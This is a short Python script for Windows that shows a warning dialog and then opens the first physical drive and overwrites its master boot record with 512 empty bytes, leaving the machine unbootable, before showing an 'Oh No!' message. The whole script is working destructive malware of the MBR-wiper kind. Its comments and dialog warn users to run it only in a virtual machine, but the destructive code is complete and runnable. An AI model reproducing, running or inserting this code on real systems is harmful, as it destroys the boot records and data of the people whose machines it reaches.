from win32file import * # pip install pywin32
from win32ui import * # MessageBox
from win32con import * # MessageBox buttons
from win32gui import *
from sys import exit

# title of warning
warningtitle = 'Warning!'
# description of warning
warningdescription = 'This program will overwrite your MBR, making your machine unusable. If your in a safe enviroment (a virtual machine for example) and know what you\'re doing you might continute. Are you really sure you want to make your machine unbootable?'

if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: # send warning and check if no is pressed
  exit() # exit the program

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
CloseHandle(hDevice) # Close the handle to our Physical Drive!

MessageBox("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)
